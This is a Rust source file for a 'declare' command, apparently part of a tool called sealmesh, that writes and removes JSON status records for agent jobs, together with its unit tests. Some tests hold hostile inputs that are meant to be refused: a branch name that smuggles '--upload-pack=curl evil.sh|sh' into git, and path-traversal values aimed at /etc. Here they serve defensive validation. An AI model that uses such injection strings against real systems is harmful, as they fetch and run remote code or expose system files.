use std::path::{Path, PathBuf};

use anyhow::{Context, Result, anyhow, bail};
use jiff::Timestamp;

use crate::{
    paths,
    wire::{BranchName, JobId, TaskProgress, ToolId},
};

#[derive(Debug)]
pub struct Args {
    pub id: String,
    pub worktree: Option<PathBuf>,
    pub state: Option<String>,
    pub branch: Option<String>,
    pub pr: Option<u32>,
    pub tasks: Option<String>,
    pub parent: Option<String>,
    pub tool: Option<String>,
    pub end: bool,
}

pub fn run(args: &Args) -> Result<()> {
    let id = JobId::try_from(args.id.as_str()).map_err(|e| anyhow!("--id is not valid: {e}"))?;

    let Some(dir) = paths::declared_agents_dir() else {
        eprintln!("sealmesh: no home directory, so nothing was declared");
        return Ok(());
    };

    if args.end {
        return remove(&dir, &id);
    }
    write(&dir, &id, args)
}

fn remove(dir: &Path, id: &JobId) -> Result<()> {
    match std::fs::remove_file(record_path(dir, id)) {
        Ok(()) | Err(_) => Ok(()),
    }
}

fn write(dir: &Path, id: &JobId, args: &Args) -> Result<()> {
    let record = build(id, args, existing_start(dir, id))?;

    if let Err(error) = std::fs::create_dir_all(dir) {
        eprintln!(
            "sealmesh: cannot create {}, so nothing was declared ({error})",
            dir.display()
        );
        return Ok(());
    }

    let json = serde_json::to_vec(&record).context("serialising the record")?;
    if let Err(error) = write_atomic(dir, id, &json) {
        eprintln!(
            "sealmesh: cannot write to {}, so nothing was declared ({error:#})",
            dir.display()
        );
    }
    Ok(())
}

fn write_atomic(dir: &Path, id: &JobId, bytes: &[u8]) -> Result<()> {
    let tmp = dir.join(format!(".{}.json.tmp.{}", id.as_str(), std::process::id()));
    std::fs::write(&tmp, bytes).with_context(|| format!("writing {}", tmp.display()))?;
    if let Err(error) = std::fs::rename(&tmp, record_path(dir, id)) {
        std::fs::remove_file(&tmp).ok();
        return Err(error).context("renaming the record into place");
    }
    Ok(())
}

fn existing_start(dir: &Path, id: &JobId) -> Option<Timestamp> {
    #[derive(serde::Deserialize)]
    struct Started {
        started_at: Timestamp,
    }

    let bytes = crate::collect::fs::read_capped(&record_path(dir, id), MAX_EXISTING_BYTES)?;
    serde_json::from_slice::<Started>(&bytes)
        .ok()
        .map(|s| s.started_at)
}

const MAX_EXISTING_BYTES: u64 = 64 * 1024;

fn record_path(dir: &Path, id: &JobId) -> PathBuf {
    dir.join(format!("{}.json", id.as_str()))
}

#[derive(Debug, serde::Serialize)]
struct Record {
    id: JobId,
    worktree: PathBuf,
    run_state: &'static str,
    started_at: Timestamp,
    updated_at: Timestamp,
    #[serde(skip_serializing_if = "Option::is_none")]
    branch: Option<BranchName>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pr: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    tasks: Option<TaskProgress>,
    #[serde(skip_serializing_if = "Option::is_none")]
    parent: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    tool: Option<ToolId>,
}

fn build(id: &JobId, args: &Args, existing_start: Option<Timestamp>) -> Result<Record> {
    let worktree = args
        .worktree
        .clone()
        .ok_or_else(|| anyhow!("--worktree is required unless --end is given"))?;
    if !worktree.is_absolute() {
        bail!("--worktree must be an absolute path");
    }

    let state = args
        .state
        .as_deref()
        .ok_or_else(|| anyhow!("--state is required unless --end is given"))?;
    let run_state = match state {
        "working" => "working",
        "idle" => "idle",
        "needs_input" => "needs_input",
        "done" => "done",
        other => bail!("--state must be working, idle, needs_input, or done, not {other:?}"),
    };

    let branch = args
        .branch
        .as_deref()
        .map(BranchName::try_from)
        .transpose()
        .map_err(|e| anyhow!("--branch is not valid: {e}"))?;

    let tasks = args.tasks.as_deref().map(parse_tasks).transpose()?;

    let parent = args
        .parent
        .as_deref()
        .map(|p| {
            crate::collect::declared::ParentId::try_from(p.to_owned())
                .map(|id| id.as_str().to_owned())
                .map_err(|e| anyhow!("--parent is not valid: {e}"))
        })
        .transpose()?;

    let tool = args
        .tool
        .as_deref()
        .map(ToolId::try_from)
        .transpose()
        .map_err(|e| anyhow!("--tool is not valid: {e}"))?;

    let now = Timestamp::now();

    Ok(Record {
        id: id.clone(),
        worktree,
        run_state,
        started_at: existing_start.unwrap_or(now),
        updated_at: now,
        branch,
        pr: args.pr,
        tasks,
        parent,
        tool,
    })
}

fn parse_tasks(value: &str) -> Result<TaskProgress> {
    let (completed, total) = value
        .split_once('/')
        .ok_or_else(|| anyhow!("--tasks must look like 3/8"))?;
    let completed: u16 = completed
        .parse()
        .map_err(|_| anyhow!("--tasks completed count is not a number 0-65535"))?;
    let total: u16 = total
        .parse()
        .map_err(|_| anyhow!("--tasks total is not a number 0-65535"))?;
    TaskProgress::new(completed, total).map_err(|e| anyhow!("--tasks is not valid: {e}"))
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

    use super::*;

    fn args(id: &str) -> Args {
        Args {
            id: id.to_owned(),
            worktree: Some(PathBuf::from("/Users/dart/work/checkout-service")),
            state: Some("working".to_owned()),
            branch: None,
            pr: None,
            tasks: None,
            parent: None,
            tool: None,
            end: false,
        }
    }

    fn scratch(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("sealmesh-declare-{name}"));
        std::fs::remove_dir_all(&dir).ok();
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn a_refresh_moves_updated_at_and_leaves_started_at_alone() {
        let dir = scratch("refresh");
        let id = JobId::try_from("1a2b3c4d").unwrap();

        let first = build(&id, &args("1a2b3c4d"), existing_start(&dir, &id)).unwrap();
        assert_eq!(first.started_at, first.updated_at);

        let long_ago: Timestamp = "2026-08-24T09:00:00Z".parse().unwrap();
        let mut aged = args("1a2b3c4d");
        aged.state = Some("needs_input".to_owned());
        let backdated = build(&id, &aged, Some(long_ago)).unwrap();
        std::fs::write(
            record_path(&dir, &id),
            serde_json::to_vec(&backdated).unwrap(),
        )
        .unwrap();

        let second = build(&id, &args("1a2b3c4d"), existing_start(&dir, &id)).unwrap();
        assert_eq!(
            second.started_at, long_ago,
            "the refresh restamped the start"
        );
        assert!(
            second.updated_at > long_ago,
            "the refresh did not push updated_at out"
        );

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn an_unreadable_previous_record_falls_back_to_now() {
        let dir = scratch("unreadable");
        let id = JobId::try_from("1a2b3c4d").unwrap();

        assert_eq!(existing_start(&dir, &id), None, "no file at all");

        std::fs::write(record_path(&dir, &id), b"{not json").unwrap();
        assert_eq!(existing_start(&dir, &id), None, "not json");

        std::fs::write(record_path(&dir, &id), br#"{"id":"1a2b3c4d"}"#).unwrap();
        assert_eq!(existing_start(&dir, &id), None, "no started_at");

        std::fs::write(record_path(&dir, &id), br#"{"started_at":"never"}"#).unwrap();
        assert_eq!(existing_start(&dir, &id), None, "unparseable started_at");

        std::fs::write(
            record_path(&dir, &id),
            br#"{"started_at":"2026-08-24T11:41:03.591Z","invented_later":1}"#,
        )
        .unwrap();
        assert!(
            existing_start(&dir, &id).is_some(),
            "a new field cost the start"
        );

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn everything_this_writes_is_something_the_reader_accepts() {
        use crate::collect::declared::{LiveSessions, read_all};

        let dir = scratch("roundtrip");
        let id = JobId::try_from("1a2b3c4d").unwrap();
        let mut a = args("1a2b3c4d");
        a.branch = Some("feature/ABC-412-retry-budget".to_owned());
        a.pr = Some(627);
        a.tasks = Some("3/8".to_owned());
        a.parent = Some("a04e3d0f-d94b-4d7e-9f02-5b09827a67f9".to_owned());

        write(&dir, &id, &a).unwrap();

        let live =
            std::collections::BTreeSet::from(["a04e3d0f-d94b-4d7e-9f02-5b09827a67f9".to_owned()]);
        let reads = read_all(
            &dir,
            jiff::SignedDuration::from_secs(900),
            Timestamp::now(),
            &LiveSessions(&live),
        );
        assert_eq!(reads.len(), 1, "{reads:#?}");
        let candidate = reads
            .first()
            .unwrap()
            .outcome
            .as_ref()
            .expect("the reader refused what the writer produced");
        assert_eq!(candidate.id.as_str(), "1a2b3c4d");
        assert_eq!(candidate.declared_pr, Some(627));
        assert_eq!(candidate.tasks_hint, Some(TaskProgress::new(3, 8).unwrap()));

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn the_minimal_invocation_round_trips() {
        use crate::collect::declared::{LiveSessions, read_all};

        let dir = scratch("minimal");
        let id = JobId::try_from("1a2b3c4d").unwrap();
        write(&dir, &id, &args("1a2b3c4d")).unwrap();

        let reads = read_all(
            &dir,
            jiff::SignedDuration::from_secs(900),
            Timestamp::now(),
            &LiveSessions(&std::collections::BTreeSet::new()),
        );
        assert!(reads.first().unwrap().outcome.is_ok(), "{reads:#?}");

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn the_file_is_named_by_the_id() {
        let dir = scratch("naming");
        let id = JobId::try_from("1a2b3c4d").unwrap();
        write(&dir, &id, &args("1a2b3c4d")).unwrap();

        assert!(dir.join("1a2b3c4d.json").is_file());
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn no_temp_file_survives_a_successful_write() {
        let dir = scratch("notemp");
        let id = JobId::try_from("1a2b3c4d").unwrap();
        write(&dir, &id, &args("1a2b3c4d")).unwrap();

        let leftovers: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n != "1a2b3c4d.json")
            .collect();
        assert!(leftovers.is_empty(), "{leftovers:?}");

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn ending_is_idempotent_and_ending_something_absent_is_fine() {
        let dir = scratch("end");
        let id = JobId::try_from("1a2b3c4d").unwrap();

        assert!(
            remove(&dir, &id).is_ok(),
            "removing an absent record failed"
        );
        write(&dir, &id, &args("1a2b3c4d")).unwrap();
        assert!(remove(&dir, &id).is_ok());
        assert!(!dir.join("1a2b3c4d.json").exists());
        assert!(remove(&dir, &id).is_ok(), "removing twice failed");

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn a_bad_argument_is_an_error_and_writes_nothing() {
        let dir = scratch("badargs");
        let id = JobId::try_from("1a2b3c4d").unwrap();

        for mutate in [
            (|a: &mut Args| a.state = Some("busy".to_owned())) as fn(&mut Args),
            |a: &mut Args| a.state = None,
            |a: &mut Args| a.worktree = Some(PathBuf::from("relative/path")),
            |a: &mut Args| a.worktree = None,
            |a: &mut Args| a.branch = Some("--upload-pack=curl evil.sh|sh".to_owned()),
            |a: &mut Args| a.tasks = Some("0/0".to_owned()),
            |a: &mut Args| a.tasks = Some("9/3".to_owned()),
            |a: &mut Args| a.tasks = Some("three of eight".to_owned()),
            |a: &mut Args| a.parent = Some("../../../../etc".to_owned()),
        ] {
            let mut a = args("1a2b3c4d");
            mutate(&mut a);
            assert!(write(&dir, &id, &a).is_err(), "accepted {a:?}");
            assert!(
                !dir.join("1a2b3c4d.json").exists(),
                "a refused argument still wrote a file: {a:?}"
            );
        }

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn an_id_that_could_walk_out_of_the_directory_is_refused() {
        for hostile in ["../../etc/passwd", "/etc/passwd", "..", "ZZZZ", "a"] {
            assert!(
                JobId::try_from(hostile).is_err(),
                "JobId accepted {hostile:?}"
            );
        }
    }

    #[test]
    fn an_unwritable_directory_is_a_no_op_not_a_failure() {
        let dir = scratch("unwritable").join("a-file-not-a-directory");
        std::fs::write(&dir, "").unwrap();

        assert!(
            write(
                &dir,
                &JobId::try_from("1a2b3c4d").unwrap(),
                &args("1a2b3c4d")
            )
            .is_ok(),
            "an unwritable directory was reported as a failure"
        );

        std::fs::remove_file(&dir).ok();
    }

    #[test]
    fn tasks_parse_the_way_the_contract_documents() {
        assert_eq!(
            parse_tasks("3/8").unwrap(),
            TaskProgress::new(3, 8).unwrap()
        );
        assert_eq!(
            parse_tasks("0/1").unwrap(),
            TaskProgress::new(0, 1).unwrap()
        );
        assert!(parse_tasks("3").is_err());
        assert!(parse_tasks("3/").is_err());
        assert!(parse_tasks("-1/8").is_err());
        assert!(parse_tasks("70000/70000").is_err());
    }
}
